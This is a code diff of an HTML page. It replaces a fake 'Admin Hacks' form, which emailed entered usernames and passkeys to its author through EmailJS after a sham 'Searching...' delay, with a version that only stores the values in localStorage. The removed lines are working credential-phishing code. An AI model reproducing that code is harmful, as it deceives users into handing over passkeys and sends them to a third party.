@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Admin Hacks</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Record Data with LocalStorage</title>
     <style>
-        /* Styling for the custom "Searching..." message */
         #searchingMessage {
             display: none;
             position: fixed;
@@ -21,62 +22,72 @@
 </head>
 <body>
 
-    <h1>
-        Press to activate <input type="text" id="username" name="username"> (selected user) admin hacks
-    </h1>
+    <h1>Press to record <input type="text" id="username" name="username"> (selected user) data</h1>
     <p>
         USER INFO: <input type="text" id="Passkey1" name="Passkey">
         Passkey: <input type="text" id="Passkey2" name="Passkey">
     </p>
 
-    <button onclick="sendEmail()">ACTIVATE ADMIN HACKS</button>
+    <button onclick="recordData()">RECORD DATA</button>
+    <button onclick="displayData()">DISPLAY STORED DATA</button>
 
     <!-- Custom "Searching..." message -->
     <div id="searchingMessage">Searching...</div>
 
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <h3>Stored Data:</h3>
+    <pre id="storedData"></pre>
 
     <script>
-        // Initialize EmailJS with your user ID
-        emailjs.init("YOUR_USER_ID");
-
-        function sendEmail() {
-            // Get the values entered by the user
+        function recordData() {
             const username = document.getElementById('username').value;
             const passkey1 = document.getElementById('Passkey1').value;
             const passkey2 = document.getElementById('Passkey2').value;
 
-            // Display the "Searching..." message
+            // Show the "Searching..." message
             document.getElementById('searchingMessage').style.display = 'block';
 
-            // Set a timeout to hide the "Searching..." message after 3 seconds (3000 milliseconds)
+            // Simulate a delay (for demonstration purposes)
             setTimeout(function() {
-                // Hide the "Searching..." message
                 document.getElementById('searchingMessage').style.display = 'none';
 
-                // Send the email using EmailJS
-                const emailParams = {
+                // Create an object with the data
+                const data = {
                     username: username,
                     passkey1: passkey1,
                     passkey2: passkey2
                 };
 
-                // You can change 'your_service_id' and 'your_template_id' to match the EmailJS service you configured
-                emailjs.send('service_74hon1v', 'template_je0ce5l', emailParams)
-                    .then(function(response) {
-                        alert("Admin hacks given and details sent to the email!");
-                    }, function(error) {
-                        alert("Failed to send email. Please try again.");
-                    });
-            }, 3000); // 3 seconds delay
+                // Save the data to local storage
+                localStorage.setItem('userData', JSON.stringify(data));
+
+                // Show a success message
+                alert('Data has been recorded successfully!');
+            }, 3000);  // 3 seconds delay
+        }
+
+        // Function to display the stored data
+        function displayData() {
+            // Retrieve data from local storage
+            const storedData = localStorage.getItem('userData');
+
+            if (storedData) {
+                // Parse the string back into an object
+                const parsedData = JSON.parse(storedData);
+
+                // Display the stored data
+                document.getElementById('storedData').textContent = JSON.stringify(parsedData, null, 2);
+            } else {
+                // If no data is found, show a message
+                document.getElementById('storedData').textContent = 'No data found in local storage.';
+            }
         }
     </script>
 
-    <p>
-        Tool Created By Arnav.
-    </p>
+    <p>Tool Created By Arnav.</p>
     <br>
-    <p style="color:#FF0000;">WARNING: Unauthorized use is prohibited!</p>
-    <br>
+    <p style="color:#FF0000">WARNING: Unauthorized use is prohibited!</p>
+    </br>
+
 </body>
 </html>
+
